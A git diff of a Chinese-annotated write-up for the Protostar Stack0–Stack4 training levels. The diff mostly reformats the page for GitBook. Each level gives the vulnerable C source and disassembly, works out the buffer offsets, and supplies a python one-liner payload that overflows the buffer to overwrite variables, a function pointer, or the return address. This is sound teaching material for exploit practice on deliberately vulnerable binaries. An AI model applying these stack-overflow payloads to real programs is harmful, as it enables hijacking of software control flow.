@@ -1,4 +1,4 @@
-# Stack
+# exploit-execise
 
 ## Stack0
 
@@ -8,6 +8,7 @@ This level introduces the concept that memory can be accessed outside of its all
 
 This level is at /opt/protostar/bin/stack0
 
+{% code title="stack0.c" %}
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -28,54 +29,55 @@ int main(int argc, char **argv)
   }
 }
 ```
+{% endcode %}
+
 查看**modified**和**buffer**的位置，
+
 ```javascript
-0x080483f4 <main+0>:	push   ebp
-0x080483f5 <main+1>:	mov    ebp,esp
-0x080483f7 <main+3>:	and    esp,0xfffffff0
-0x080483fa <main+6>:	sub    esp,0x60
-0x080483fd <main+9>:	mov    DWORD PTR [esp+0x5c],0x0       // modified = 0
-0x08048405 <main+17>:	lea    eax,[esp+0x1c]                 // buffer
-0x08048409 <main+21>:	mov    DWORD PTR [esp],eax
-0x0804840c <main+24>:	call   0x804830c <gets@plt>
-0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
-0x08048415 <main+33>:	test   eax,eax
-0x08048417 <main+35>:	je     0x8048427 <main+51>
-0x08048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
-0x08048420 <main+44>:	call   0x804832c <puts@plt>
-0x08048425 <main+49>:	jmp    0x8048433 <main+63>
-0x08048427 <main+51>:	mov    DWORD PTR [esp],0x8048529
-0x0804842e <main+58>:	call   0x804832c <puts@plt>
-0x08048433 <main+63>:	leave
-0x08048434 <main+64>:	ret
+0x080483f4 <main+0>:    push   ebp
+0x080483f5 <main+1>:    mov    ebp,esp
+0x080483f7 <main+3>:    and    esp,0xfffffff0
+0x080483fa <main+6>:    sub    esp,0x60
+0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0       // modified = 0
+0x08048405 <main+17>:    lea    eax,[esp+0x1c]                 // buffer
+0x08048409 <main+21>:    mov    DWORD PTR [esp],eax
+0x0804840c <main+24>:    call   0x804830c <gets@plt>
+0x08048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]
+0x08048415 <main+33>:    test   eax,eax
+0x08048417 <main+35>:    je     0x8048427 <main+51>
+0x08048419 <main+37>:    mov    DWORD PTR [esp],0x8048500
+0x08048420 <main+44>:    call   0x804832c <puts@plt>
+0x08048425 <main+49>:    jmp    0x8048433 <main+63>
+0x08048427 <main+51>:    mov    DWORD PTR [esp],0x8048529
+0x0804842e <main+58>:    call   0x804832c <puts@plt>
+0x08048433 <main+63>:    leave
+0x08048434 <main+64>:    ret
 ```
 
 可以看到**buffer**的位置是`esp+0x1c`， **modified**变量在`esp+0x5c`， 二者距离是**0x40**，也就是**64个字节大小**，通过`输入超过64个字节的数据`，就能**覆盖modified变量**.
 
 `python -c "print('A'*68)" | ./stack0`
 
-
-|  stack     |
-| ---------- |
+| stack |
+| :--- |
 | esp + 0x1c |
-|            |
-|            |
+|       ... |
+|       ... |
 | esp + 0x5c |
-
----
 
 ## Stack1
 
 ### About
+
 This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
 
 This level is at /opt/protostar/bin/stack1
 
 Hints
 
-If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
-Protostar is **little endian**
+If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend. Protostar is **little endian**
 
+{% code title="stack1.c" %}
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -101,14 +103,13 @@ int main(int argc, char **argv)
   }
 }
 ```
+{% endcode %}
 
 传递一个参数，将参数复制到**buffer**中，`覆盖modifies变量`
 
-```shell
+```text
 ./stack1 `python -c "print('A'*64+'dcba')"`
 ```
-
----
 
 ## Stack2
 
@@ -118,6 +119,7 @@ Stack2 looks at environment variables, and how they can be set.
 
 This level is at /opt/protostar/bin/stack2
 
+{% code title="stack2.c" %}
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -148,29 +150,29 @@ int main(int argc, char **argv)
 
 }
 ```
+{% endcode %}
 
 通过**getenv**获取了环境变量**GREENIE**，然后将**GREENIE**的内容复制到**buffer**中，我们这里通过**export**设置环境变量即可。
 
-linux中**$()** 和 **\`\`**都是用来做命令替换用的。
+linux中**$\(\)** 和 **\`\`**都是用来做命令替换用的。
 
-```shell
+```text
 export GREENIE=$(python -c "print('A' * 64 + '\x0a\x0d\x0a\x0d')"); ./stack2
 ```
-
----
 
 ## Stack3
 
 ### About
 
-Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
+Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack \(as a prelude to overwriting the saved EIP\)
 
 **Hints**
 
-- both gdb and objdump is your friend you determining where the win() function lies in memory.
+* both gdb and objdump is your friend you determining where the win\(\) function lies in memory.
 
 This level is at /opt/protostar/bin/stack3
 
+{% code title="stack3.c" %}
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -197,10 +199,11 @@ int main(int argc, char **argv)
   }
 }
 ```
+{% endcode %}
 
-有个**函数指针**，通过**gets**将**fp的内容**覆盖成**win函数的地址**(前提是没有开`PIE`)。
+有个**函数指针**，通过**gets**将**fp的内容**覆盖成**win函数的地址**\(前提是没有开`PIE`\)。
 
-```shell
+```text
 python -c "print('A' * 64 + '\x24\x84\x04\x08')" | ./stack3
 ```
 
@@ -214,12 +217,12 @@ This level is at /opt/protostar/bin/stack4
 
 **Hints**
 
-- A variety of introductory papers into buffer overflows may help.
-- gdb lets you do “run < input”
-- EIP is not directly after the end of buffer, compiler padding can also increase the size.
+* A variety of introductory papers into buffer overflows may help.
+* gdb lets you do “run &lt; input”
+* EIP is not directly after the end of buffer, compiler padding can also increase the size.
 
+{% code title="stack4.c" %}
 ```c
-
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -237,6 +240,7 @@ int main(int argc, char **argv)
   gets(buffer);
 }
 ```
+{% endcode %}
 
 典型的**buffer overflow**， 通过**覆盖返回地址控制程序流程**
 
@@ -250,11 +254,12 @@ Dump of assembler code for function main:
    0x08048415 <+13>:    mov    DWORD PTR [esp],eax
    0x08048418 <+16>:    call   0x804830c <gets@plt>
    0x0804841d <+21>:    leave  
-   0x0804841e <+22>:    ret 
+   0x0804841e <+22>:    ret
 ```
 
 **buffer的位置**在`esp+0x10`处，`$ebp - $esp = 88`，我们需要`填充88-0x10=72个字节`，然后**下面四个字节是ebp**，在**下面四个字节是返回地址**。
 
-```shell
+```text
  python -c "print('A'*76 + '\xf4\x83\x04\x08')" | ./stack4
 ```
+
